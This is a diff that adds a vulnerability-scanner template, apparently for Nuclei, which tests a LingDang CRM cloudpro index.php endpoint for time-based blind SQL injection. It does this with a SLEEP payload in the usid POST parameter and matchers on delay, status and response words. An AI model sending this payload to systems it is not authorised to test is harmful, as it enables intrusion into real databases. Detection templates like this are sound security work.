@@ -1,0 +1,33 @@
+id: LingDangCRM-cloudpro-sqlInjection
+
+info:
+  name: LingDangCRM-cloudpro-index.php-sqlInjection
+  author: iSee857
+  severity: high
+  description: LingDangCRM-cloudpro-index.php-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/x-www-form-urlencoded
+
+        action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a) -- q&my_cloudid=0
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 6"
+
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "搜索客户名称"
